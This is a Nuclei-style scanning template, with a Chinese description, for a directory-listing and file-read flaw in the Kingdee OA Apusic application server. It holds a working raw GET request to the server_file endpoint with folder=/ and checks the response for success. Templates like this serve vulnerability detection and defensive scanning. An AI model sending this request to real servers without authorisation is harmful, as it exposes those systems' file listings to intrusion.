id: jindieOA-Apusic-dir-listing
info:
  name: 金蝶OA Apusic应用服务器(中间件) server_file 目录遍历漏洞
  author: cnaq
  severity: medium
  description: 金蝶OA Apusic应用服务器(中间件) 存在任意文件读取漏洞，攻击者通过漏洞可以获取目录下的文件信息
  reference:
    - http://wiki.peiqi.tech/wiki/oa/%E9%87%91%E8%9D%B6OA/%E9%87%91%E8%9D%B6OA%20Apusic%E5%BA%94%E7%94%A8%E6%9C%8D%E5%8A%A1%E5%99%A8-%E4%B8%AD%E9%97%B4%E4%BB%B6%20server_file%20%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E.html
  tags: jindieOA,server_file,dir
requests:
  - raw:
      - |
        GET /admin/protected/selector/server_file/files?folder=/ HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        part: body
        words:
          - 'total'